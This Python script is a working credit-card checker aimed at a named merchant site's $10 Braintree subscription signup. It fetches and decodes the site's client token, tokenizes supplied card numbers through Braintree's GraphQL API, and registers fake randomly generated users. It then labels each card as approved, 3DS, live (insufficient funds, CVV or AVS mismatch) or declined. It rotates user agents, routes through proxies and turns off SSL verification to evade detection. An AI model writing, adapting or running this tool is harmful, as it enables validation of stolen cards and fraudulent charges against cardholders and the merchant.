import aiohttp
from aiohttp_socks import ProxyConnector
import json
import base64
import random
import string
import asyncio

BASE = "https://www.mixtapemobstaz.com"
GRAPHQL = "https://payments.braintree-api.com/graphql"

TOKENIZE_QUERY = """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
  tokenizeCreditCard(input: $input) {
    token
    creditCard {
      bin brandCode last4 expirationMonth expirationYear
      binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId }
    }
  }
}"""

UAS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
]

FN = ['James','John','Robert','Michael','David','William','Richard','Thomas','Daniel','Matthew']
LN = ['Smith','Johnson','Williams','Brown','Jones','Davis','Miller','Wilson','Anderson','Taylor']

def rand_user():
    fn = random.choice(FN)
    ln = random.choice(LN)
    num = random.randint(100, 9999)
    username = f"{fn.lower()}{ln.lower()}{num}"
    email = f"{username}@gmail.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + "!"
    phone = f"303{random.randint(100,999)}{random.randint(1000,9999)}"
    return username, email, password, phone

def classify(msg):
    m = (msg or '').lower()
    if any(x in m for x in ('approved','settling','authorized','succeeded','subscribed','subscription created')):
        return "approved", "Subscription Created / Approved"
    
    if any(k in m for k in ('verification required', '3d', '3ds', 'authenticate', 'authentication required', 'challenge')):
        return "3ds", "3D Secure / Verification Required"

    if any(k in m for k in ('insufficient', 'cvv', 'avs')):
        if 'insufficient' in m:
            return "live", "Insufficient Funds"
        elif 'cvv' in m:
            return "live", "CVV Mismatch"
        else:
            return "live", "AVS Mismatch"

    return "declined", msg[:80] if msg else "Declined"

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        formatted = ps
    else:
        parts = ps.split(":")
        if len(parts) == 4:
            if parts[1].isdigit():
                formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif parts[3].isdigit():
                formatted = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
            else:
                formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            formatted = f"http://{parts[0]}:{parts[1]}"
        else:
            formatted = f"http://{ps}"

    if formatted.startswith("socks5://"):
        formatted = formatted.replace("socks5://", "socks5h://")
    elif formatted.startswith("socks4://"):
        formatted = formatted.replace("socks4://", "socks4a://")

    return formatted

async def check_card_mixtape(cc, mm, yy, cvc, proxy_url=None):
    """
    Asynchronous Braintree $10 Subscription check on mixtapemobstaz.com.
    Returns: (status, message, brand)
    """
    if len(yy) == 2:
        yy = f"20{yy}"

    formatted_proxy = _format_proxy(proxy_url)

    headers_base = {
        'User-Agent': random.choice(UAS),
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept': 'application/json, text/plain, */*',
    }

    try:
        if formatted_proxy:
            connector = ProxyConnector.from_url(formatted_proxy, ssl=False)
        else:
            connector = aiohttp.TCPConnector(ssl=False)

        timeout = aiohttp.ClientTimeout(total=20, connect=8)
        async with aiohttp.ClientSession(connector=connector, headers=headers_base, timeout=timeout) as session:
            # Step 1: Get Braintree Client Token
            token = ""
            try:
                async with session.get(f"{BASE}/api/user/braintree-client-token-public") as r_tok:
                    if r_tok.status == 200:
                        data_tok = await r_tok.json()
                        token = data_tok.get('clientToken', '')
            except Exception:
                pass

            if not token:
                return "error", "Failed to fetch Braintree token", "N/A"

            try:
                padded = token + '=' * (4 - len(token) % 4)
                decoded = json.loads(base64.b64decode(padded))
                auth_fp = decoded.get('authorizationFingerprint')
            except Exception as e:
                return "error", f"Failed to decode authorization fingerprint: {e}", "N/A"

            if not auth_fp:
                return "error", "Failed to decode authorization fingerprint", "N/A"

            # Step 2: Tokenize Card via Braintree GraphQL
            gql_headers = {
                'Authorization': f'Bearer {auth_fp}',
                'Braintree-Version': '2018-05-10',
                'Content-Type': 'application/json',
                'Origin': BASE,
            }
            gql_payload = {
                'query': TOKENIZE_QUERY,
                'variables': {"input": {"creditCard": {
                    "number": cc, "expirationMonth": mm,
                    "expirationYear": yy, "cvv": cvc
                }, "options": {"validate": False}}},
                'operationName': 'TokenizeCreditCard'
            }
            async with session.post(GRAPHQL, json=gql_payload, headers=gql_headers) as r_gql:
                data_gql = await r_gql.json()

            tc = data_gql.get('data', {}).get('tokenizeCreditCard', {})
            nonce = tc.get('token')
            card_info = tc.get('creditCard', {})
            brand = card_info.get('brandCode', 'Braintree')

            if not nonce:
                gql_errors = data_gql.get('errors', [])
                if gql_errors and isinstance(gql_errors, list):
                    first_err = gql_errors[0].get('message', 'Braintree Card Tokenization Failed')
                    return "declined", first_err, brand
                return "error", "Braintree Card Tokenization Failed", brand

            # Step 3: Subscribe
            username, email, password, phone = rand_user()
            sub_payload = {
                "username": username,
                "email": email,
                "password": password,
                "mobilephone": phone,
                "invite_code": None,
                "plan_id": "plan-01",
                "braintreePayment": {
                    "nonce": nonce,
                    "details": {
                        "cardholderName": None,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "bin": cc[:6],
                        "cardType": brand,
                        "lastFour": cc[-4:],
                        "lastTwo": cc[-2:],
                    },
                    "type": "CreditCard",
                    "description": f"ending in {cc[-4:]}",
                    "binData": card_info.get('binData', {}),
                }
            }
            sub_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*',
                'Origin': BASE,
                'Referer': f"{BASE}/signup-plan/plan-01",
            }

            async with session.post(f"{BASE}/api/user/subscribe2", json=sub_payload, headers=sub_headers) as r_sub:
                try:
                    resp = await r_sub.json()
                    msg = resp.get('msg', '') or resp.get('message', '')
                except Exception:
                    msg = (await r_sub.text())[:100]

            status, reason = classify(msg)
            return status, reason, brand

    except asyncio.TimeoutError:
        return "error", "Connection timed out", "N/A"
    except Exception as e:
        return "error", str(e), "N/A"

